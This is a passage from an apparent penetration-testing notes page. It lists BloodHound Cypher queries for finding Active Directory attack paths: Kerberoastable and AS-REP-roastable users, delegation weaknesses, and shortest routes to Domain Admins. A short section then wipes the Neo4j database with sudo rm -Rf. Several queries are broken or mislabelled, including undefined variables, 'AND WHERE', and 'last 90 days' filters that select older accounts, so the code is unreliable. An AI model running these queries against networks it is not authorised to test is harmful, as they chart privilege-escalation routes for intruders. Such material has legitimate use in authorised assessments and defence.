                    "title": "Select destination domain...",
                    "query": "MATCH (n:Domain) RETURN n.name ORDER BY n.name DESC"
                },
                {
                    "final": true,
                    "query": "MATCH (n:User {domain: {result}}) MATCH (m:Computer {domain: {}}) MATCH p=allShortestPaths((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) RETURN p",
                    "startNode": "{}",
                    "allowCollapse": false
                }
            ]
        },
        {
            "name": "Find all computers with Unconstrained Delegation",
            "queryList": [{
                "final": true,
                "query": "MATCH (c:Computer {unconstraineddelegation:true}) return c"
            }]
        },
        {
            "name": "Find all computers with unsupported operating systems",
            "queryList": [{
                "final": true,
                "query": "MATCH (H:Computer) WHERE H.operatingsystem =~ '.*(2000|2003|2008|xp|vista|7|me)*.' RETURN H"
            }]
        },
        {
            "name": "Find users that logged in within the last 90 days",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User) WHERE u.lastlogon < (datetime().epochseconds - (90 * 86400)) and NOT u.lastlogon IN [-1.0, 0.0] RETURN u"
            }]
        },
        {
            "name": "Find users with passwords last set within the last 90 days",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User) WHERE u.pwdlastset < (datetime().epochseconds - (90 * 86400)) and NOT u.pwdlastset IN [-1.0, 0.0] RETURN u"
            }]
        },
        {
            "name": "Find constrained delegation",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(u:User)-[:AllowedToDelegate]->(c:Computer) RETURN p"
            }]
        },
        {
            "name": "Find computers that allow unconstrained delegation that AREN’T domain controllers.",
            "queryList": [{
                "final": true,
                "query": "MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH (c2:Computer {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2"
            }]
        },
        {
            "name": " Return the name of every computer in the database where at least one SPN for the computer contains the string 'MSSQL'",
            "queryList": [{
                "final": true,
                "query": "MATCH (c:Computer) WHERE ANY (x IN c.serviceprincipalnames WHERE toUpper(x) CONTAINS 'MSSQL') RETURN c"
            }]
        },
        {
            "name": "View all GPOs",
            "queryList": [{
                "final": true,
                "query": "Match (n:GPO) RETURN n"
            }]
        },
        {
            "name": "View all groups that contain the word 'admin'",
            "queryList": [{
                "final": true,
                "query": "Match (n:Group) WHERE n.name CONTAINS 'ADMIN' RETURN n"
            }]
        },
        {
            "name": "Find users that can be AS-REP roasted",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User {dontreqpreauth: true}) RETURN u"
            }]
        },
        {
            "name": "Find All Users with an SPN/Find all Kerberoastable Users with passwords last set > 5 years ago",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User) WHERE n.hasspn=true AND WHERE u.pwdlastset < (datetime().epochseconds - (1825 * 86400)) and NOT u.pwdlastset IN [-1.0, 0.0] RETURN u"
            }]
        },
        {
            "name": "Show all high value target's groups",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(n:User)-[r:MemberOf*1..]->(m:Group {highvalue:true}) RETURN p"
            }]
        },
        {
            "name": "Find groups that contain both users and computers",
            "queryList": [{
                "final": true,
                "query": "MATCH (c:Computer)-[r:MemberOf*1..]->(groupsWithComps:Group) WITH groupsWithComps MATCH (u:User)-[r:MemberOf*1..]->(groupsWithComps) RETURN DISTINCT(groupsWithComps) as groupsWithCompsAndUsers"
            }]
        },
        {
            "name": "Shortest Path from Domain Users to High Value Targets",
            "queryList": [{
                "final": true,
                "query": "MATCH (g:Group),(n {highvalue:true}),p=shortestPath((g)-[r*1..]->(n)) WHERE g.name STARTS WITH 'DOMAIN USERS' return p",
                "allowCollapse": true
            }]
        },
        {
            "name": "ALL Path from Domain Users to High Value Targets",
            "queryList": [{
                "final": true,
                "query": "MATCH (g:Group) WHERE g.name STARTS WITH 'DOMAIN USERS'  MATCH (n {highvalue:true}),p=shortestPath((g)-[r*1..]->(n)) return p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Find Kerberoastable users who are members of high value groups",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User)-[r:MemberOf*1..]->(g:Group) WHERE g.highvalue=true AND u.hasspn=true RETURN u"
            }]
        },
        {
            "name": "Find Kerberoastable users and where they are AdminTo",
            "queryList": [{
                "final": true,
                "query": "OPTIONAL MATCH (u1:User) WHERE u1.hasspn=true OPTIONAL MATCH (u1)-[r:AdminTo]->(c:Computer) RETURN u"
            }]
        },
        {
            "name": "Find computers with constrained delegation permissions and the corresponding targets where they allowed to delegate",
            "queryList": [{
                "final": true,
                "query": "MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c"
            }]
        },
        {
            "name": "Find if any domain user has interesting permissions against a GPO (Warning: Heavy)",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(u:User)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|GpLink*1..]->(g:GPO) RETURN p"
            }]
        },
        {
            "name": "Find if unprivileged users have rights to add members into groups",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AddMember*1..]->(m:Group)) RETURN p"
            }]
        },
        {
            "name": "Find all users a part of the VPN group",
            "queryList": [{
                "final": true,
                "query": "Match p=(u:User)-[:MemberOf]->(g:Group) WHERE toUPPER (g.name) CONTAINS 'VPN' return p"
            }]
        },
        {
            "name": "Paths from DU to DA without RDP",
            "queryList": [{
                    "final": false,
                    "title": "Select a Domain Admin group...",
                    "query": "MATCH (n:Group) WHERE n.objectsid =~ {name} RETURN n.name ORDER BY n.name DESC",
                    "props": {
                        "name": "(?i)S-1-5-.*-512"
                    }
                },
                {
                    "final": true,
                    "query": "MATCH (n:User),(m:Group {name:{result}}),p=shortestPath((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) RETURN p",
                    "allowCollapse": true,
                    "endNode": "{}"
                }
            ]
        },
        {
            "name": "Most Exploitable Paths to DA",
            "queryList": [{
                    "final": false,
                    "title": "Select a Domain Admin group...",
                    "query": "MATCH (n:Group) WHERE n.objectsid =~ {name} RETURN n.name ORDER BY n.name DESC",
                    "props": {
                        "name": "(?i)S-1-5-.*-512"
                    }
                },
                {
                    "final": true,
                    "query": "MATCH (n:User),(m:Group {name:{result}}),p=shortestPath((n)-[r:MemberOf|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) RETURN p",
                    "allowCollapse": true,
                    "endNode": "{}"
                }
            ]
        },
        {
            "name": "Find users that have never logged on and account is still active",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User) WHERE n.lastlogontimestamp=-1.0 AND n.enabled=TRUE RETURN n "
            }]
        }
    ]
}
```
{% endtab %}

{% tab title="Zephyr" %}
URL: [https://github.com/ZephrFish/Bloodhound-CustomQueries](https://github.com/ZephrFish/Bloodhound-CustomQueries)
{% endtab %}
{% endtabs %}

{% hint style="info" %}
Keep in mind that Bloodhound captures a 'snapshot' of the current state of Active Directory at the time of capture and as such results may change when captured again in the future.
{% endhint %}



## Purging Neo4j Database

This will wipe the database of all data. Requires setting new credentials again on [http://localhost:7474/browser/](http://localhost:7474/browser/)

```
sudo rm -Rf /etc/neo4j/data/databases/* data/transactions/*
sudo rm -Rf /etc/neo4j/data/transactions/*
```

## Resources

* [https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
* [https://sansorg.egnyte.com/dl/zscX9KYH5M/?](https://sansorg.egnyte.com/dl/zscX9KYH5M/?)
* [https://github.com/BloodHoundAD/BloodHound/releases](https://github.com/BloodHoundAD/BloodHound/releases)
